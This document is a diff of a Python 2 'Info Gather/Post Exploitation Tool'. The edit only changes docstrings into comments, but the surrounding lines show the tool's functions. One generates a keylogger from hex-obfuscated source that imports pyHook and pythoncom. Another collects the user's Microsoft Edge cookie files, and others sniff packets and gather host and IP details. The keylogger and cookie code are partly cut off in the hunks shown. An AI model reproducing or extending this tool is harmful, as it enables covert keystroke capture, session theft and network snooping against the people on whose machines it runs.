@@ -10,8 +10,7 @@ from bs4 import BeautifulSoup
 
 
 def arguments():
-    '''Program Usage.
-    Returns arguments being passed in.'''
+    # Program Usage. Returns arguments being passed in.
     parser = ArgumentParser(description='Info Gather/Post Exploitation Tool')
     parser.add_argument('-s', '--search', help='search file')
     parser.add_argument('-p', '--path', help='specify file path')
@@ -37,8 +36,7 @@ def arguments():
 
 
 def search_file(filename_arg, path_arg):
-    '''loops the selected drive's files and
-        searches for a particular string.'''
+    # loops the selected drive's files and searches for a particular string.
     print '[+]Searching..'
     for path, directories, files in os.walk(path_arg):
         for directory in directories:
@@ -51,7 +49,7 @@ def search_file(filename_arg, path_arg):
 
 
 def system_detection():
-    '''Attempts To Find System Hardware, Hostname and Operating System.'''
+    # Attempts To Find System Hardware, Hostname and Operating System.
     print '[+]Host Information'
     print '-' * 60
     print '[+]Platform:', platform.platform()
@@ -62,7 +60,7 @@ def system_detection():
 
 
 def get_ipv4():
-    '''Fetches Website Content, and grabs the ip'''
+    # Fetches Website Content, and grabs the ip
     url = 'http://checkip.dyndns.org'
     print '[+]Fetching Public IP Address Using', url
     request = requests.get(url)
@@ -71,7 +69,7 @@ def get_ipv4():
 
 
 def generate_keylogger():
-    '''Generates keylogger script'''
+    # Generates a keylogger script
     source = "\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x48\x6f\x6f\x6b\x0d\x0a"
     source += "\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x74\x68\x6f\x6e"
     source += "\x63\x6f\x6d\x0d\x0a\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x6c"
@@ -124,7 +122,7 @@ def generate_keylogger():
 
 
 def scrape_all_links(scrape_all_links_arg):
-    '''fetches a specific page and searches for every link'''
+    # Fetches a specific page and finds links
     print '[+]Fetching links from', scrape_all_links_arg
     print '-' * 60
     page = requests.get("http://{}/".format(scrape_all_links_arg))
@@ -137,7 +135,7 @@ def scrape_all_links(scrape_all_links_arg):
 
 
 def grab_local_cookies():
-    '''fetches locally stored cookies'''
+    # Fetches locally stored cookies
     current_user = os.environ.get('USERNAME')
     common_browser_cookie_file_paths = ['C:\users\{}\AppData\Local\MicrosoftEdge\Cookies'.format(current_user),
                                         'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\INetCookies'.format(current_user),
@@ -165,14 +163,14 @@ def grab_local_cookies():
 
 
 def sniff_packets(interface_arg):
-    '''packet sniffer'''
+    # Packet sniffer
     sniffer = sniff(iface=interface_arg, prn=lambda packet: packet.summary())
     print sniffer
 
 
 def main():
-    '''Main Function, matches arguments with
-        the appropiate function to be called.'''
+    # Main Function, matches arguments with the appropiate function
+    # to be called.
     (search_string, path_string, system_details, pub_ip, keylogger_script,
         scrapper, grab_cookies, interface, sniff) = arguments()
     if search_string and path_string:
